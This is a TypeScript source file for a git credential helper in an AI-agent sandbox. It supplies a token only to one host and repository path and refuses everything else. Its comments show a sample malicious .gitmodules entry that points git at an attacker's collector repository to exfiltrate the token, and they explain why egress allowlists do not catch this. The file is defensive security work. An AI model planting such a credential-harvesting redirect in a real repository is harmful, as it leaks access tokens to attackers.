/**
 * Git credential helper (ADR-0002 §5).
 *
 * The agent never holds a token. But git needs one to push, so something must
 * supply it — and that something runs as a *separate process*, outside the
 * model's control, invoked by git itself. The token exists in that process for
 * the duration of one request and is never placed in the environment, in
 * `.git/config`, or in a remote URL.
 *
 * This is what makes threat-model §5.1 survivable: a prompt injection that
 * fully succeeds finds no credential to steal, because there is none in the
 * agent's reach.
 *
 * ── The attack this file mostly exists to stop ───────────────────────────────
 *
 * Git asks the credential helper for credentials for whatever host and path it
 * is currently talking to. A hostile repository controls that.
 *
 *     # .gitmodules in a repository we are migrating
 *     [submodule "innocuous"]
 *         url = https://github.com/attacker/collector
 *
 * A `git submodule update`, a rewritten remote, or an `insteadOf` rule in a
 * committed `.gitconfig` all cause git to request credentials for a target the
 * attacker chose. A helper that answers every request hands the token over,
 * and git — not our code — performs the exfiltration.
 *
 * That route defeats controls that look like they should catch it. The egress
 * allowlist in ADR-0006 permits git traffic to github.com, so a redirect to
 * another repository *on github.com* is fully allowed network activity. The
 * sandbox sees nothing anomalous. The diff policy never runs, because no diff
 * is involved.
 *
 * So the helper answers exactly one host and one repository path, and refuses
 * everything else. Scoping is the control; there is no second line of defence
 * behind it.
 */

import {
  ScopedToken,
  type AuthorisedUse,
} from "./token.ts";

export type CredentialOperation = "get" | "store" | "erase";

export interface CredentialRequest {
  readonly protocol?: string;
  readonly host?: string;
  readonly path?: string;
  readonly username?: string;
}

export interface HelperScope {
  /** Exactly one host, e.g. "github.com". */
  readonly host: string;
  /** Repository path without leading slash, e.g. "acme/widgets". */
  readonly repositoryPath: string;
}

export type HelperOutcome =
  | { readonly kind: "credentials"; readonly output: string }
  | { readonly kind: "no-output" }
  | { readonly kind: "refused"; readonly reason: RefusalReason; readonly detail: string };

export type RefusalReason =
  | "unsupported-operation"
  | "insecure-protocol"
  | "host-mismatch"
  | "path-mismatch"
  | "path-missing"
  | "token-expired"
  | "malformed-request";

export class CredentialHelper {
  readonly #token: ScopedToken;
  readonly #scope: HelperScope;

  constructor(token: ScopedToken, scope: HelperScope) {
    this.#token = token;
    this.#scope = {
      host: scope.host.toLowerCase(),
      repositoryPath: normalisePath(scope.repositoryPath),
    };
  }

  handle(operation: CredentialOperation, request: CredentialRequest): HelperOutcome {
    // `store` and `erase` are deliberately inert. Implementing `store` would
    // write a credential to disk, which is standing privilege — precisely what
    // ADR-0002 exists to eliminate. Git tolerates a helper that ignores them.
    if (operation === "store" || operation === "erase") {
      return { kind: "no-output" };
    }
    if (operation !== "get") {
      return {
        kind: "refused",
        reason: "unsupported-operation",
        detail: `Unknown credential operation "${String(operation)}".`,
      };
    }

    // Downgrade to http would put the token on the wire in cleartext. Git will
    // happily ask, if a remote or an insteadOf rule says so.
    if (request.protocol !== undefined && request.protocol.toLowerCase() !== "https") {
      return {
        kind: "refused",
        reason: "insecure-protocol",
        detail: `Refusing to supply a credential over "${request.protocol}".`,
      };
    }

    if (!request.host) {
      return {
        kind: "refused",
        reason: "malformed-request",
        detail: "Credential request carried no host.",
      };
    }

    if (request.host.toLowerCase() !== this.#scope.host) {
      return {
        kind: "refused",
        reason: "host-mismatch",
        detail: `Request for "${request.host}"; this helper serves only "${this.#scope.host}".`,
      };
    }

    // ── The important one ────────────────────────────────────────────────────
    // Git omits `path` unless credential.useHttpPath is enabled. For a forge
    // where every repository shares one host, host matching alone authorises
    // *any* repository on github.com — which is exactly the submodule attack
    // above. A request with no path is therefore refused outright rather than
    // being treated as a host-level match.
    if (!request.path) {
      return {
        kind: "refused",
        reason: "path-missing",
        detail:
          "Credential request carried no path. Set credential.useHttpPath=true — " +
          "without it this helper cannot distinguish one repository from another " +
          "on the same host, and would authorise all of them.",
      };
    }

    if (normalisePath(request.path) !== this.#scope.repositoryPath) {
      return {
        kind: "refused",
        reason: "path-mismatch",
        detail:
          `Request for "${normalisePath(request.path)}"; this helper is scoped to ` +
          `"${this.#scope.repositoryPath}". A repository asking for credentials to a ` +
          `different repository is an exfiltration attempt, not a misconfiguration.`,
      };
    }

    if (this.#token.expired) {
      return {
        kind: "refused",
        reason: "token-expired",
        detail: `Token ${this.#token.tokenId} has expired. The job must re-mint.`,
      };
    }

    const secret = ScopedToken.revealForAuthorisedUse(
      this.#token,
      "git-credential-helper" satisfies AuthorisedUse,
    );

    // GitHub installation tokens authenticate as x-access-token.
    return {
      kind: "credentials",
      output: `username=x-access-token\npassword=${secret}\n`,
    };
  }
}

/** Git sends paths without a leading slash; `.git` may or may not be present. */
function normalisePath(path: string): string {
  return path.replace(/^\/+/, "").replace(/\.git$/, "").toLowerCase();
}

/**
 * Parses git's credential protocol: `key=value` lines, terminated by a blank
 * line or EOF.
 *
 * Unknown keys are ignored rather than rejected — git adds keys over time
 * (`wwwauth[]`, `capability[]`), and a helper that fails on an unrecognised
 * one breaks on the next git release. Duplicate keys take the last value,
 * matching git's own behaviour; accepting the *first* would let an attacker
 * prepend a legitimate path before their own.
 */
export function parseCredentialRequest(input: string): CredentialRequest {
  const request: Record<string, string> = {};
  for (const line of input.split("\n")) {
    if (line === "") continue;
    const separator = line.indexOf("=");
    if (separator === -1) continue;
    const key = line.slice(0, separator);
    const value = line.slice(separator + 1);
    // Array-valued keys are informational; we never authorise on them.
    if (key.endsWith("[]")) continue;
    request[key] = value;
  }
  return {
    ...(request["protocol"] !== undefined && { protocol: request["protocol"] }),
    ...(request["host"] !== undefined && { host: request["host"] }),
    ...(request["path"] !== undefined && { path: request["path"] }),
    ...(request["username"] !== undefined && { username: request["username"] }),
  };
}

/**
 * Git configuration that routes credential requests here.
 *
 * Returned as argv pairs rather than a config file: written to `.git/config`
 * they would be readable by the agent, and `insteadOf` rules committed in the
 * repository could override them. Passed as `-c` arguments on the git command
 * line they take precedence over repository configuration and leave nothing
 * on disk.
 */
export function gitCredentialArgs(helperCommand: string): readonly string[] {
  return Object.freeze([
    // Ignore any helper the repository or the environment tries to introduce.
    "-c",
    "credential.helper=",
    "-c",
    `credential.helper=${helperCommand}`,
    // Without this git omits the path and the helper cannot tell repositories
    // apart. See the refusal above — this is not optional.
    "-c",
    "credential.useHttpPath=true",
    // A hostile repository must not be able to rewrite where git connects.
    "-c",
    "url.https://github.com/.insteadOf=",
    "-c",
    "protocol.allow=never",
    "-c",
    "protocol.https.allow=always",
    // Submodules are the primary vector for redirected credential requests.
    "-c",
    "submodule.recurse=false",
  ]);
}
